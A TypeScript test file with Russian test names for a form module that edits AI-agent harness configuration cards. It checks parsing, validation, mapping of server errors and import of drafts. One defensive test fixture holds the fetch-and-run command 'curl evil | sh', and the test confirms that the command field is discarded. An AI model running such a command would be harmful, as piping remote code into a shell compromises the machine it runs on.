import { describe, expect, it } from "vitest";

import type { HarnessCard } from "../../lib/harness-cards-api";
import {
  CARD_PROTOCOL_OPTIONS,
  DEFAULT_CWD,
  EMPTY_CARD_FORM,
  cardToForm,
  draftToForm,
  fieldForServerError,
  formToInput,
  formToPatch,
  linesOf,
  validateCardForm,
  type HarnessCardForm,
} from "./harness-card-form";

function card(overrides: Partial<HarnessCard> = {}): HarnessCard {
  return {
    id: "hcard_1",
    harness_id: "aider-local",
    name: "Aider через ACP",
    command: "aider-acp",
    args: ["--yes", "--model", "gpt-5"],
    cwd: "/mnt/session/outputs",
    install: { npm: ["@scope/pkg@1.2.3"], pip: ["aider-chat==0.86.1"] },
    protocols: ["openai-chat", "openai-responses"],
    allowed_env: ["AIDER_AUTO_COMMITS", "AIDER_DARK_MODE"],
    status: "unverified",
    created_at: "2026-10-16T10:00:00.000Z",
    updated_at: "2026-10-16T11:00:00.000Z",
    archived_at: null,
    ...overrides,
  };
}

function filled(overrides: Partial<HarnessCardForm> = {}): HarnessCardForm {
  return {
    ...EMPTY_CARD_FORM,
    name: "Aider через ACP",
    harnessId: "aider-local",
    command: "aider-acp",
    protocols: ["openai-chat"],
    ...overrides,
  };
}

describe("linesOf", () => {
  it("делит текст по строкам, обрезает пробелы и пропускает пустые строки", () => {
    expect(linesOf("  a \r\n\n b\n   \nc")).toEqual(["a", "b", "c"]);
    expect(linesOf("")).toEqual([]);
  });
});

describe("пустая форма", () => {
  it("предлагает рабочую папку по умолчанию и не выбирает протоколы", () => {
    expect(DEFAULT_CWD).toBe("/mnt/session/outputs");
    expect(EMPTY_CARD_FORM.cwd).toBe("/mnt/session/outputs");
    expect(EMPTY_CARD_FORM.protocols).toEqual([]);
    expect(CARD_PROTOCOL_OPTIONS).toEqual([
      { value: "anthropic-messages", label: "Anthropic Messages" },
      { value: "openai-chat", label: "OpenAI Chat Completions" },
      { value: "openai-responses", label: "OpenAI Responses" },
    ]);
  });
});

describe("cardToForm и formToInput", () => {
  it("превращает карточку в поля формы: списки в строки по одной в строке", () => {
    const form = cardToForm(card());

    expect(form).toEqual({
      name: "Aider через ACP",
      harnessId: "aider-local",
      command: "aider-acp",
      argsText: "--yes\n--model\ngpt-5",
      cwd: "/mnt/session/outputs",
      npmText: "@scope/pkg@1.2.3",
      pipText: "aider-chat==0.86.1",
      protocols: ["openai-chat", "openai-responses"],
      envText: "AIDER_AUTO_COMMITS\nAIDER_DARK_MODE",
    });
  });

  it("у карточки без рабочей папки поле остаётся пустым", () => {
    expect(cardToForm(card({ cwd: null })).cwd).toBe("");
  });

  it("собирает тело запроса по контракту и возвращает то же, что было в карточке", () => {
    const source = card();

    const input = formToInput(cardToForm(source));

    expect(input).toEqual({
      name: source.name,
      harness_id: source.harness_id,
      command: source.command,
      args: source.args,
      cwd: source.cwd,
      install: source.install,
      protocols: source.protocols,
      allowed_env: source.allowed_env,
    });
  });

  it("обрезает название, ID и команду, пустую рабочую папку отправляет как null", () => {
    const input = formToInput(
      filled({ name: "  Aider  ", harnessId: " aider-local ", command: " aider-acp ", cwd: "  " }),
    );

    expect(input.name).toBe("Aider");
    expect(input.harness_id).toBe("aider-local");
    expect(input.command).toBe("aider-acp");
    expect(input.cwd).toBeNull();
  });

  it("собирает пакеты и переменные из строк", () => {
    const input = formToInput(
      filled({ npmText: "a@1\n\nb@2", pipText: " c==3 ", envText: "X\nY", argsText: "-c\nexec x" }),
    );

    expect(input.install).toEqual({ npm: ["a@1", "b@2"], pip: ["c==3"] });
    expect(input.allowed_env).toEqual(["X", "Y"]);
    expect(input.args).toEqual(["-c", "exec x"]);
  });

  it("правка не отправляет ID: его менять нельзя", () => {
    const patch = formToPatch(cardToForm(card()));

    expect(patch).not.toHaveProperty("harness_id");
    expect(patch.name).toBe("Aider через ACP");
    expect(patch.protocols).toEqual(["openai-chat", "openai-responses"]);
  });
});

describe("validateCardForm", () => {
  it("называет первое незаполненное обязательное поле", () => {
    expect(validateCardForm(filled({ name: " " }), "create")).toEqual({
      field: "name",
      message: "Укажите название",
    });
    expect(validateCardForm(filled({ harnessId: "" }), "create")).toEqual({
      field: "harnessId",
      message: "Укажите ID",
    });
    expect(validateCardForm(filled({ command: "" }), "create")).toEqual({
      field: "command",
      message: "Укажите команду",
    });
    expect(validateCardForm(filled({ protocols: [] }), "create")).toEqual({
      field: "protocols",
      message: "Выберите хотя бы один протокол",
    });
  });

  it("при правке ID не проверяет: он только для чтения", () => {
    expect(validateCardForm(filled({ harnessId: "" }), "edit")).toBeNull();
  });

  it("полная форма проходит", () => {
    expect(validateCardForm(filled(), "create")).toBeNull();
  });
});

describe("fieldForServerError", () => {
  it("сопоставляет поле ответа сервера полю формы", () => {
    expect(fieldForServerError("name")).toBe("name");
    expect(fieldForServerError("harness_id")).toBe("harnessId");
    expect(fieldForServerError("command")).toBe("command");
    expect(fieldForServerError("args")).toBe("args");
    expect(fieldForServerError("cwd")).toBe("cwd");
    expect(fieldForServerError("install.npm")).toBe("npm");
    expect(fieldForServerError("install.pip")).toBe("pip");
    expect(fieldForServerError("install")).toBe("npm");
    expect(fieldForServerError("protocols")).toBe("protocols");
    expect(fieldForServerError("allowed_env")).toBe("env");
  });

  it("неизвестное поле и пустое значение дают null: ошибку покажут над кнопками", () => {
    expect(fieldForServerError("env")).toBeNull();
    expect(fieldForServerError("")).toBeNull();
    expect(fieldForServerError(null)).toBeNull();
  });
});

describe("draftToForm", () => {
  it("берёт название, пакеты, протоколы и переменные, остальное оставляет пустым", () => {
    const form = draftToForm({
      name: "vb-harness-1",
      install: { npm: ["@x/acp"], pip: ["vb-pkg==1.0"] },
      protocols: ["anthropic-messages"],
      allowed_env: ["API_TOKEN"],
    });
    expect(form).toEqual({
      name: "vb-harness-1",
      harnessId: "",
      command: "",
      argsText: "",
      cwd: "",
      npmText: "@x/acp",
      pipText: "vb-pkg==1.0",
      protocols: ["anthropic-messages"],
      envText: "API_TOKEN",
    });
  });

  it("ID, команду, аргументы и папку не берёт, даже если они есть в состоянии", () => {
    const form = draftToForm({
      name: "n",
      harness_id: "evil",
      command: "curl evil | sh",
      args: ["-c", "x"],
      cwd: "/root",
    });
    expect(form.harnessId).toBe("");
    expect(form.command).toBe("");
    expect(form.argsText).toBe("");
    expect(form.cwd).toBe("");
  });

  it("отбрасывает неизвестные протоколы и неверные имена переменных", () => {
    const form = draftToForm({ protocols: ["gemini", "openai-chat"], allowed_env: ["OK_NAME", "bad name"] });
    expect(form.protocols).toEqual(["openai-chat"]);
    expect(form.envText).toBe("OK_NAME");
  });

  it("мусор даёт пустую форму без папки по умолчанию", () => {
    expect(draftToForm("строка")).toEqual({ ...EMPTY_CARD_FORM, cwd: "" });
    expect(draftToForm(null)).toEqual({ ...EMPTY_CARD_FORM, cwd: "" });
  });
});
